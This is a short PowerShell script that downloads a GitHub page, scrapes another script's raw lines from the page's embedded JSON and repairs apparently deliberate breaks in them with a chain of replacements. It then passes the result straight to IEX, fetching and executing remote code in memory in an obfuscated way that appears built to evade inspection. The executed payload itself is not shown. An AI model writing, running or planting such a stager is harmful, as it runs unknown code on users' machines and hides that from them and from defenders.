$url = "https://github.com/jamc-contractor/prueba/blob/main/abcde.ps1"
$response = Invoke-WebRequest -Uri $url
$htmlContent = $response.Content
$regexDiv = '<script type="application/json" data-target="react-app.embeddedData">(.*)</script>'
$matchesDiv = [regex]::Matches($htmlContent, $regexDiv, [System.Text.RegularExpressions.RegexOptions]::Singleline)
$regexDiv2 = '"rawLines":(.*?),"stylingDirectives'
$matchesDiv2 = [regex]::Matches($matchesDiv, $regexDiv2, [System.Text.RegularExpressions.RegexOptions]::Singleline)
$matchesDiv3 = $matchesDiv2 -replace '"', '' -replace '\\', '' -replace '\s+', '' -replace 'rawLines:\[', '' -replace ',stylingDirectives', '' -replace ',',"`n" -replace 'rht','r ht' -replace 'pe\$co','pe $co' -replace 'X\$p','X $p' -replace 'rta\]','rta' -replace 'e=SQ','e="SQ' -replace 'AA=','AA="'
IEX $matchesDiv3
